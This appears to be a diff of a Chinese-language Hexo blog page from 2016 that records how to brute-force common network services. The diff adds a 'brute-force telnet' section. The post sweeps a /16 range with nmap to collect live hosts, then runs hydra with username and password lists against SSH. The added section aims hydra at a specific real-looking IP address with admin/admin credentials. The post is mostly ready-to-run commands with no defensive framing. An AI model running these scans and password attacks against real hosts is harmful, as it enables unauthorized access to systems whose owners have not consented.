@@ -36,24 +36,30 @@
 
 
 <meta name="description" content="记录一下常见端口的爆破姿势，用到了nmap的一些脚本，爆破工具hydra，以及自己写的一些脚本。
-Ubuntu 14版 32位系统安装nmap，hydra    apt-get install nmap    apt-get install hydra hydra-gtk
+Ubuntu 14版 32位系统安装nmap，hydra
+apt-get install nmap 
+apt-get install hydra hydra-gtk
 nmap搜集信息以22端口为例
-nmap -v -sn -PE -n --min-hostgroup 1024 --min-p">
+nmap -v -sn -PE -n --min-hostgroup 1024 --min-parall">
 <meta property="og:type" content="article">
 <meta property="og:title" content="范围爆破常见服务">
 <meta property="og:url" content="http://yoursite.com/2016/02/18/范围爆破常见服务/index.html">
 <meta property="og:site_name" content="FengGe">
 <meta property="og:description" content="记录一下常见端口的爆破姿势，用到了nmap的一些脚本，爆破工具hydra，以及自己写的一些脚本。
-Ubuntu 14版 32位系统安装nmap，hydra    apt-get install nmap    apt-get install hydra hydra-gtk
+Ubuntu 14版 32位系统安装nmap，hydra
+apt-get install nmap 
+apt-get install hydra hydra-gtk
 nmap搜集信息以22端口为例
-nmap -v -sn -PE -n --min-hostgroup 1024 --min-p">
-<meta property="og:updated_time" content="2016-02-18T07:11:48.610Z">
+nmap -v -sn -PE -n --min-hostgroup 1024 --min-parall">
+<meta property="og:updated_time" content="2016-02-22T08:50:47.734Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="范围爆破常见服务">
 <meta name="twitter:description" content="记录一下常见端口的爆破姿势，用到了nmap的一些脚本，爆破工具hydra，以及自己写的一些脚本。
-Ubuntu 14版 32位系统安装nmap，hydra    apt-get install nmap    apt-get install hydra hydra-gtk
+Ubuntu 14版 32位系统安装nmap，hydra
+apt-get install nmap 
+apt-get install hydra hydra-gtk
 nmap搜集信息以22端口为例
-nmap -v -sn -PE -n --min-hostgroup 1024 --min-p">
+nmap -v -sn -PE -n --min-hostgroup 1024 --min-parall">
 
 
 <script type="text/javascript" id="hexo.configuration">
@@ -238,8 +244,10 @@ nmap -v -sn -PE -n --min-hostgroup 1024 --min-p">
 
       
         <span itemprop="articleBody"><p>记录一下常见端口的爆破姿势，用到了nmap的一些脚本，爆破工具hydra，以及自己写的一些脚本。</p>
-<h2 id="Ubuntu_14版_32位系统">Ubuntu 14版 32位系统</h2><p>安装nmap，hydra<br>    apt-get install nmap<br>    apt-get install hydra hydra-gtk</p>
-<h2 id="nmap搜集信息">nmap搜集信息</h2><p>以22端口为例</p>
+<h2 id="Ubuntu_14版_32位系统">Ubuntu 14版 32位系统</h2><p>安装nmap，hydra</p>
+<pre><code>apt-get <span class="operator"><span class="keyword">install</span> nmap 
+apt-<span class="keyword">get</span> <span class="keyword">install</span> hydra hydra-gtk</span>
+</code></pre><h2 id="nmap搜集信息">nmap搜集信息</h2><p>以22端口为例</p>
 <pre><code><span class="keyword">nmap</span> -<span class="keyword">v</span> -<span class="keyword">sn</span> -PE -<span class="keyword">n</span> --<span class="built_in">min</span>-hostgroup <span class="number">1024</span> --<span class="built_in">min</span>-parallelism <span class="number">1024</span> -oG nmap_output IP/<span class="number">16</span>
 #扫下<span class="keyword">b</span>段，把存活主机筛选出来
 <span class="keyword">cat</span> nmap_output | <span class="keyword">grep</span> Up |awk <span class="string">'{print $2}'</span> &gt; target_alive
@@ -256,6 +264,8 @@ nmap -v -sn -PE -n --min-hostgroup 1024 --min-p">
 #-M读取爆破目标，-s为指定爆破端口，-t为运行的线程数默认为<span class="number">16</span>
 hydra IP ssh -s port -L username<span class="class">.txt</span> -P password<span class="class">.txt</span> -t <span class="number">50</span>
 #直接用IP爆破
+</code></pre><h2 id="爆破telnet">爆破telnet</h2><pre><code>hydra <span class="number">123.103</span><span class="number">.58</span><span class="number">.186</span> telnet -l admin -p admin -t <span class="number">1</span> -s <span class="number">23</span> -e ns -f -V
+<span class="preprocessor">#-s之后的参数不知道有啥用~用到了再研究</span>
 </code></pre><p>总结：基本思路就是使用nmap获得爆破目标(ftp,ssh,smtp,pop,mysql…)并处理，用hydra对目标进行爆破。</p>
 </span>
       
@@ -275,6 +285,8 @@ hydra IP ssh -s port -L username<span class="class">.txt</span> -P password<span
       
         <div class="post-nav">
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/02/25/性能测试学习-1/" rel="prev">性能测试学习-1</a>
             
           </div>
 
@@ -346,7 +358,7 @@ hydra IP ssh -s port -L username<span class="class">.txt</span> -P password<span
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">48</span>
+              <span class="site-state-item-count">49</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -417,7 +429,7 @@ hydra IP ssh -s port -L username<span class="class">.txt</span> -P password<span
           <div class="post-toc">
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Ubuntu_14版_32位系统"><span class="nav-number">1.</span> <span class="nav-text">Ubuntu 14版 32位系统</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nmap搜集信息"><span class="nav-number">2.</span> <span class="nav-text">nmap搜集信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#爆破ssh"><span class="nav-number">3.</span> <span class="nav-text">爆破ssh</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Ubuntu_14版_32位系统"><span class="nav-number">1.</span> <span class="nav-text">Ubuntu 14版 32位系统</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nmap搜集信息"><span class="nav-number">2.</span> <span class="nav-text">nmap搜集信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#爆破ssh"><span class="nav-number">3.</span> <span class="nav-text">爆破ssh</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#爆破telnet"><span class="nav-number">4.</span> <span class="nav-text">爆破telnet</span></a></li></ol></div>
             
           </div>
           <div class="post-toc-indicator-bottom post-toc-indicator"></div>
